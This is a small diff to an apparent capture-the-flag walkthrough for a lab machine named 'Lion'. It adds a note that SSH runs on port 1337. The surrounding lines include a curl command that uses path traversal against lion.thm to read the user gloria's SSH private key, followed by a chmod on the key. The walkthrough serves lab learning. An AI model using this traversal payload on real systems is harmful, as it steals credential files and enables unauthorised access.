@@ -1,4 +1,5 @@
 # Lion
+# Notes: SSH Port is 1337
 ## Method 1
 3. `curl lion.thm:5555/?page=../../../../../../home/gloria/.ssh/id_rsa`
 4. `chmod 777 id_rsa`
